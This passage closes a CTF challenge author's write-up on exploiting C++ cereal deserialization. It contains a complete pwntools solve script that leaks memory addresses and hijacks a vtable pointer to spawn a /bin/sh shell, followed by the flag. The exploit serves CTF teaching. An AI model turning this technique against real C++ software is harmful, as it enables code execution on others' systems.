	<span class="token string">'value3'</span><span class="token punctuation">:</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token string">'value4'</span><span class="token punctuation">:</span> libc_base <span class="token operator">+</span> <span class="token number">0xa5688</span><span class="token punctuation">,</span> <span class="token comment"># mov rdi, [rax+8]; call [rax]</span>
	<span class="token string">'value5'</span><span class="token punctuation">:</span> <span class="token number">0x4646464646464646</span><span class="token punctuation">,</span>
	<span class="token string">'value6'</span><span class="token punctuation">:</span> <span class="token number">0x4747474747474747</span><span class="token punctuation">,</span>
	<span class="token string">'value7'</span><span class="token punctuation">:</span> libc_base <span class="token operator">+</span> <span class="token number">0x1740b1</span><span class="token punctuation">,</span> <span class="token comment"># mov rax, [rdi+8]; call [rax+0x10]</span>
<span class="token punctuation">}</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p class="caption"><sup>Alternative solution by @lolc4t.</sup></p><h2 id="conclusion" tabindex="-1"><a class="md-anchor" href="#conclusion" aria-hidden="true"></a> Conclusion</h2><p>This was an interest challenge to make as it helped refresh my binary exploitation skills despite me sucking at pwn challenges. I was also happy that players came up with different solutions, challenging my biases on what makes a successful gadget chain.</p><p>Overall, this has been a fun experience exploring and exploiting a niche use case of C++ serialization libraries. I have a few variant challenges I might present in future CTFs. We'll see if they make it out.</p><p>Special thanks to <a href="https://www.thehackerscrew.team/" rel="noreferrer" target="_blank">thehackerscrew CTF team</a> for hosting my CTF challenge and to the players who opened my mind by sharing their solves.</p><p><a id="logical-end-of-article"></a></p><h2 id="solve-script" tabindex="-1"><a class="md-anchor" href="#solve-script" aria-hidden="true"></a> Solve Script</h2><div class="code-toolbar"><pre class="language-python" tabindex="0"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> re

<span class="token comment"># context.log_level = 'debug'</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'breakfast'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'breakfast'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/usr/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
libcpp <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/usr/lib/x86_64-linux-gnu/libstdc++.so.6'</span><span class="token punctuation">)</span>

vtable_leak_json <span class="token operator">=</span> <span class="token triple-quoted-string string">"""{
    "value0": {
        "ptr_wrapper": {
            "id": 2147483649,
            "data": {
                "ingredients": {
                    "value0": 0,
                    "value1": 0,
                    "value2": 0,
                    "value3": 0,
                    "value4": 0,
                    "value5": 0,
                    "value6": 0,
                    "value7": 0
                }
            }
        }
    },
    "value1": {
        "polymorphic_id": 1073741824,
        "ptr_wrapper": {
            "id": 2147483650,
            "data": {
                "spread": 8
            }
        }
    },
    "value2": {
        "ptr_wrapper": {
            "id": 2
        }
    }
}"""</span>

mem_read_json <span class="token operator">=</span> <span class="token triple-quoted-string string">"""{
    "value0": {
        "ptr_wrapper": {
            "id": 2147483649,
            "data": {
                "ingredients": {
                    "value0": %d,
                    "value1": %d,
                    "value2": %d,
                    "value3": 0,
                    "value4": 0,
                    "value5": 0,
                    "value6": 0,
                    "value7": 0
                }
            }
        }
    },
    "value1": {
        "polymorphic_id": 1073741824,
        "ptr_wrapper": {
            "id": 2147483650,
            "data": {
                "spread": 0
            }
        }
    },
    "value2": {
        "ptr_wrapper": {
            "id": 1
        }
    }
}"""</span>

vptr_hijack_json <span class="token operator">=</span> <span class="token triple-quoted-string string">"""{
    "value0": {
        "ptr_wrapper": {
            "id": 2147483649,
            "data": {
                "ingredients": {
                    "value0": %d,
                    "value1": %d,
                    "value2": %d,
                    "value3": %d,
                    "value4": %d,
                    "value5": %d,
                    "value6": 0,
                    "value7": 0
                }
            }
        }
    },
    "value1": {
        "polymorphic_id": 1073741824,
        "ptr_wrapper": {
            "id": 1
        }
    },
    "value2": {
        "ptr_wrapper": {
            "id": 2147483650,
            "data": {
                "name": "Apple"
            }
        }
    }
}"""</span>


<span class="token keyword">def</span> <span class="token function">send_json</span><span class="token punctuation">(</span>contents<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> skip_output<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    line <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\s+'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> contents<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>line<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> skip_output<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>
    
    <span class="token comment"># Parse output....</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\nc: '</span><span class="token punctuation">)</span>
    _data1 <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\nf: '</span><span class="token punctuation">)</span>
    bytes3 <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\nMmm- crunchy!'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> bytes3


<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nleak vtable address'</span><span class="token punctuation">)</span>
bytes_ <span class="token operator">=</span> send_json<span class="token punctuation">(</span>vtable_leak_json<span class="token punctuation">)</span>
vtable_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>bytes_<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>vtable_addr<span class="token operator">=</span><span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nfind libc address'</span><span class="token punctuation">)</span>
got_malloc <span class="token operator">=</span> vtable_addr <span class="token operator">+</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'malloc'</span><span class="token punctuation">]</span> <span class="token operator">-</span> e<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_ZN5Toast3eatEv'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>got_malloc<span class="token operator">=</span><span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
bytes_ <span class="token operator">=</span> send_json<span class="token punctuation">(</span>mem_read_json <span class="token operator">%</span> <span class="token punctuation">(</span>got_malloc<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

malloc_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>bytes_<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>malloc_addr<span class="token operator">=</span><span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> malloc_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'malloc'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>libc_base<span class="token operator">=</span><span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span>libc_base <span class="token operator">&amp;</span> <span class="token number">0xfff</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nfind libc++ address'</span><span class="token punctuation">)</span>
got_throw <span class="token operator">=</span> vtable_addr <span class="token operator">+</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__cxa_throw'</span><span class="token punctuation">]</span> <span class="token operator">-</span> e<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_ZN5Toast3eatEv'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>got_throw<span class="token operator">=</span><span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
bytes_ <span class="token operator">=</span> send_json<span class="token punctuation">(</span>mem_read_json <span class="token operator">%</span> <span class="token punctuation">(</span>got_throw<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

throw_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>bytes_<span class="token punctuation">)</span>
libcpp_base <span class="token operator">=</span> throw_addr <span class="token operator">-</span> libcpp<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__cxa_throw'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>libcpp_base<span class="token operator">=</span><span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
<span class="token keyword">assert</span> <span class="token punctuation">(</span>libcpp_base <span class="token operator">&amp;</span> <span class="token number">0xfff</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nleak the heap'</span><span class="token punctuation">)</span>
base64_chars_addr <span class="token operator">=</span> vtable_addr <span class="token operator">+</span> e<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_ZN6cereal6base64L5charsE'</span><span class="token punctuation">]</span> <span class="token operator">-</span> e<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_ZN5Toast3eatEv'</span><span class="token punctuation">]</span>
bytes_ <span class="token operator">=</span> send_json<span class="token punctuation">(</span>mem_read_json <span class="token operator">%</span> <span class="token punctuation">(</span>base64_chars_addr<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
heap_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>bytes_<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>heap_addr<span class="token operator">=</span><span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nfind the congee chunk'</span><span class="token punctuation">)</span>
length<span class="token punctuation">,</span> needle <span class="token operator">=</span> <span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token number">0x41424344</span>
bytes_ <span class="token operator">=</span> send_json<span class="token punctuation">(</span>mem_read_json <span class="token operator">%</span> <span class="token punctuation">(</span>heap_addr<span class="token punctuation">,</span> length<span class="token punctuation">,</span> needle<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bytes_<span class="token punctuation">)</span> <span class="token operator">==</span> length<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'expected to read </span><span class="token interpolation"><span class="token punctuation">{</span>length<span class="token punctuation">}</span></span><span class="token string"> bytes'</span></span>
<span class="token keyword">assert</span> p64<span class="token punctuation">(</span>needle<span class="token punctuation">)</span> <span class="token keyword">in</span> bytes_<span class="token punctuation">,</span> <span class="token string">'unable to find needle in the haystack, maybe try a larger search length?'</span>
found_addr <span class="token operator">=</span> heap_addr <span class="token operator">+</span> bytes_<span class="token punctuation">.</span>index<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>needle<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">16</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'FOUND THE CONGEE CHUNK! - </span><span class="token interpolation"><span class="token punctuation">{</span>found_addr<span class="token operator">=</span><span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">"""
# one_gadget -f /usr/lib/x86_64-linux-gnu/libc.so.6

0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp
"""</span>

<span class="token comment"># </span>
<span class="token comment"># Approach 1: One-Gadget</span>
<span class="token comment"># </span>

set_r12_0_gadget <span class="token operator">=</span> libcpp_base <span class="token operator">+</span> <span class="token number">0xf0a0c</span>
set_rbx_0_gadget <span class="token operator">=</span> libcpp_base <span class="token operator">+</span> <span class="token number">0xf5e83</span>
one_gadget_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xef4ce</span>
send_json<span class="token punctuation">(</span>vptr_hijack_json <span class="token operator">%</span> <span class="token punctuation">(</span>
    found_addr <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">,</span>
    set_r12_0_gadget<span class="token punctuation">,</span>
    set_rbx_0_gadget<span class="token punctuation">,</span>
    one_gadget_addr<span class="token punctuation">,</span>
    <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token number">0</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>

<span class="token comment"># </span>
<span class="token comment"># Approach 2: system("/bin/sh")</span>
<span class="token comment"># </span>

<span class="token comment"># send_json(vptr_hijack_json % (</span>
<span class="token comment">#     found_addr + 0x10,</span>
<span class="token comment">#     found_addr + 0x18,</span>
<span class="token comment">#     libc_base + 0x1740b1,</span>
<span class="token comment">#     libc_base + libc.sym.system,</span>
<span class="token comment">#     libc_base + next(libc.search(b'/bin/sh')),</span>
<span class="token comment">#     libc_base + 0xa5688,</span>
<span class="token comment"># ), True)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><h2 id="flag" tabindex="-1"><a class="md-anchor" href="#flag" aria-hidden="true"></a> Flag</h2><div class="code-toolbar"><pre class="language-text" tabindex="0"><code class="language-text">crew{Pu2e_C3real_OrieNteD_Pro9ramM!ng_i5_wh@t_i_l1ke_to_cal1_it}</code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Plain Text</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><hr class="footnotes-sep"><b>Footnotes</b><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p>For further reading on JOP, I recommend reading this StackExchange answer: <a href="https://security.stackexchange.com/questions/201196/concept-of-jump-oriented-programming-jop" rel="noreferrer" target="_blank">Security.SE: Concept of Jump-Oriented-Programming (JOP)</a>. It provides an excellent summary and brief history on ROP/JOP. <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p>We exclude stack-based gadgets to simplify the exploit, even if an attack with such gadgets may be possible. The reason for doing so is that we don’t have direct control over stack memory. We would need the help of gadgets to push/modify the stack. Even then, modifying the stack without fine-grained control potentially crashes the program. So we explore other alternatives first. <a href="#fnref2" class="footnote-backref">↩︎</a></p></li></ol></section></div><a id="end-of-article"></a><br><script defer src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><div class="post-share dim-gentle mb-3 d-flex flex-row align-items-center"><div class="d-flex flex-row flex-wrap align-items-center gap-3"><span>Share&nbsp;on</span> <a class="no-decoration" data-sharer="reddit" data-title="Sharing is Caring: Arbitrary Code Execution for Breakfast" data-url="https://trebledj.me/posts/arbitrary-code-execution-for-breakfast/"><span class="fs-4"><i class="fab fa-reddit"></i> </span></a><a class="no-decoration" data-sharer="telegram" data-title="Sharing is Caring: Arbitrary Code Execution for Breakfast" data-url="https://trebledj.me/posts/arbitrary-code-execution-for-breakfast/"><span class="fs-4"><i class="fab fa-telegram"></i> </span></a><a class="no-decoration" data-sharer="whatsapp" data-title="Sharing is Caring: Arbitrary Code Execution for Breakfast" data-url="https://trebledj.me/posts/arbitrary-code-execution-for-breakfast/"><span class="fs-4"><i class="fab fa-whatsapp"></i> </span></a><a class="no-decoration" data-sharer="linkedin" data-title="Sharing is Caring: Arbitrary Code Execution for Breakfast" data-url="https://trebledj.me/posts/arbitrary-code-execution-for-breakfast/"><span class="fs-4"><i class="fab fa-linkedin"></i> </span></a><a class="no-decoration" data-sharer="vk" data-title="Sharing is Caring: Arbitrary Code Execution for Breakfast" data-url="https://trebledj.me/posts/arbitrary-code-execution-for-breakfast/"><span class="fs-4"><i class="fab fa-vk"></i> </span></a><a class="no-decoration" data-sharer="twitter" data-title="Sharing is Caring: Arbitrary Code Execution for Breakfast" data-url="https://trebledj.me/posts/arbitrary-code-execution-for-breakfast/"><span class="fs-4"><i class="fab fa-twitter"></i> </span></a><a id="copy-link-button" class="no-decoration" data-bs-toggle="tooltip" data-bs-trigger="click" title="Link copied!"><span class="fs-4"><i class="fas fa-link"></i></span></a></div></div><hr><div id="post-author-container" class="d-flex justify-content-between align-items-center gap-3" itemprop="author" itemscope itemtype="https://schema.org/Person"><img src="/img/profile-icon.jpg" class="profile-img" alt="" loading="lazy" decoding="async" itemprop="image"><div class="author-info d-flex flex-column gap-1"><p class="profile-name" itemprop="name">TrebledJ</p><p class="profile-bio" itemprop="description">Passionate problem-solver, pentester, and autodidact. I thrive on learning new things and enjoy passing it on. When not immersed in bughunting or programming, I can be found taking walks, composing a short tune, and occasionally indulging in CTF challenges.</p></div></div><hr class="section-sep"><div id="related" class="jw-100"><h3><i class="fas fa-circle-nodes me-2"></i>Related Posts</h3><div class="row gx-3 mt-4"><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/gdb-cheatsheet/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/gdb-cheatsheet/"><img class="post-img-blurred-bg" src="/img/posts/programming/cheatsheets/assets/gef-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 250" alt="Thumbnail for GDB/GEF Cheatsheet" srcset="/img/posts/programming/cheatsheets/assets/gef-256w.webp 256w, /img/posts/programming/cheatsheets/assets/gef-512w.webp 512w, /img/posts/programming/cheatsheets/assets/gef-906w.webp 906w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/programming/cheatsheets/assets/gef-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 250" alt="Thumbnail for GDB/GEF Cheatsheet" srcset="/img/posts/programming/cheatsheets/assets/gef-256w.webp 256w, /img/posts/programming/cheatsheets/assets/gef-512w.webp 512w, /img/posts/programming/cheatsheets/assets/gef-906w.webp 906w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">GDB/GEF Cheatsheet</h2><div class="post-summary"><p>Quick command reference on one of the most powerful tools for dynamic analysis.</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/cheatsheet/" itemprop="keywords">cheatsheet</a> </span><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/oracle-opera-vulns/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/oracle-opera-vulns/"><img class="post-img-blurred-bg" src="/img/posts/vulnerability-research/opera-cves/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 341" alt="Thumbnail for When Hospitality Software is Too Hospitable (CVE-2026-21966, CVE-2026-21967)" srcset="/img/posts/vulnerability-research/opera-cves/assets/thumbnail-256w.webp 256w, /img/posts/vulnerability-research/opera-cves/assets/thumbnail-512w.webp 512w, /img/posts/vulnerability-research/opera-cves/assets/thumbnail-810w.webp 810w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/vulnerability-research/opera-cves/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 341" alt="Thumbnail for When Hospitality Software is Too Hospitable (CVE-2026-21966, CVE-2026-21967)" srcset="/img/posts/vulnerability-research/opera-cves/assets/thumbnail-256w.webp 256w, /img/posts/vulnerability-research/opera-cves/assets/thumbnail-512w.webp 512w, /img/posts/vulnerability-research/opera-cves/assets/thumbnail-810w.webp 810w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">When Hospitality Software is Too Hospitable (CVE-2026-21966, CVE-2026-21967)</h2><div class="post-summary"><p>An XSS Filter Bypass and a Curious SSRF in Oracle Hospitality OPERA</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/research/" itemprop="keywords">research</a> </span><span><a class="jtag" href="/tags/web/" itemprop="keywords">web</a> </span><span><a class="jtag" href="/tags/java/" itemprop="keywords">java</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/reversing-a-siemens-plc-for-funs-and-vulns/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/reversing-a-siemens-plc-for-funs-and-vulns/"><img class="post-img-blurred-bg" src="/img/posts/vulnerability-research/siemens-cves/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 398" alt="Thumbnail for Reverse Engineering a Siemens Programmable Logic Controller for Funs and Vulns (CVE-2024-54089, CVE-2024-54090 & CVE-2025-40757)" srcset="/img/posts/vulnerability-research/siemens-cves/assets/thumbnail-256w.webp 256w, /img/posts/vulnerability-research/siemens-cves/assets/thumbnail-512w.webp 512w, /img/posts/vulnerability-research/siemens-cves/assets/thumbnail-576w.webp 576w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/vulnerability-research/siemens-cves/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 398" alt="Thumbnail for Reverse Engineering a Siemens Programmable Logic Controller for Funs and Vulns (CVE-2024-54089, CVE-2024-54090 & CVE-2025-40757)" srcset="/img/posts/vulnerability-research/siemens-cves/assets/thumbnail-256w.webp 256w, /img/posts/vulnerability-research/siemens-cves/assets/thumbnail-512w.webp 512w, /img/posts/vulnerability-research/siemens-cves/assets/thumbnail-576w.webp 576w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Reverse Engineering a Siemens Programmable Logic Controller for Funs and Vulns (CVE-2024-54089, CVE-2024-54090 &amp; CVE-2025-40757)</h2><div class="post-summary"><p>When security by obscurity breaks...</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/research/" itemprop="keywords">research</a> </span><span><a class="jtag" href="/tags/embedded/" itemprop="keywords">embedded</a> </span><span><a class="jtag" href="/tags/reverse/" itemprop="keywords">reverse</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/output-invariant-prompt-injection/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/output-invariant-prompt-injection/"><img class="post-img-blurred-bg" src="/img/posts/infosec/output-invariant-prompt-injection/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 384" alt="Thumbnail for Output-Invariant and Time-Based Testing – Practical Techniques for Black-Box Enumeration of LLMs" srcset="/img/posts/infosec/output-invariant-prompt-injection/assets/thumbnail-256w.webp 256w, /img/posts/infosec/output-invariant-prompt-injection/assets/thumbnail-512w.webp 512w, /img/posts/infosec/output-invariant-prompt-injection/assets/thumbnail-1024w.webp 1024w, /img/posts/infosec/output-invariant-prompt-injection/assets/thumbnail-1536w.webp 1536w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/infosec/output-invariant-prompt-injection/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 384" alt="Thumbnail for Output-Invariant and Time-Based Testing – Practical Techniques for Black-Box Enumeration of LLMs" srcset="/img/posts/infosec/output-invariant-prompt-injection/assets/thumbnail-256w.webp 256w, /img/posts/infosec/output-invariant-prompt-injection/assets/thumbnail-512w.webp 512w, /img/posts/infosec/output-invariant-prompt-injection/assets/thumbnail-1024w.webp 1024w, /img/posts/infosec/output-invariant-prompt-injection/assets/thumbnail-1536w.webp 1536w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Output-Invariant and Time-Based Testing – Practical Techniques for Black-Box Enumeration of LLMs</h2><div class="post-summary"><p>Abusing inherent context and sluggishness in LLMs for stealthy enumeration of prompt injection points.</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/ai/" itemprop="keywords">ai</a> </span><span><a class="jtag" href="/tags/notes/" itemprop="keywords">notes</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/boomlang-blue-team-strikes-back-et-cvss-and-dllmodules/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/boomlang-blue-team-strikes-back-et-cvss-and-dllmodules/"><img class="post-img-blurred-bg" src="/img/posts/misc/satire/2025/assets/weekend-tech-reads-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 404" alt="Thumbnail for 5 Weekend Reads You Missed: BOOMlang v2, Blue Team Strikes Back, ET, CVSS 4.1, and DLLModules" srcset="/img/posts/misc/satire/2025/assets/weekend-tech-reads-thumbnail-256w.webp 256w, /img/posts/misc/satire/2025/assets/weekend-tech-reads-thumbnail-512w.webp 512w, /img/posts/misc/satire/2025/assets/weekend-tech-reads-thumbnail-1024w.webp 1024w, /img/posts/misc/satire/2025/assets/weekend-tech-reads-thumbnail-1536w.webp 1536w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/misc/satire/2025/assets/weekend-tech-reads-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 404" alt="Thumbnail for 5 Weekend Reads You Missed: BOOMlang v2, Blue Team Strikes Back, ET, CVSS 4.1, and DLLModules" srcset="/img/posts/misc/satire/2025/assets/weekend-tech-reads-thumbnail-256w.webp 256w, /img/posts/misc/satire/2025/assets/weekend-tech-reads-thumbnail-512w.webp 512w, /img/posts/misc/satire/2025/assets/weekend-tech-reads-thumbnail-1024w.webp 1024w, /img/posts/misc/satire/2025/assets/weekend-tech-reads-thumbnail-1536w.webp 1536w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">5 Weekend Reads You Missed: BOOMlang v2, Blue Team Strikes Back, ET, CVSS 4.1, and DLLModules</h2><div class="post-summary"><p>Breaking news, awesome stuff happened!</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/satire/" itemprop="keywords">satire</a> </span><span><a class="jtag" 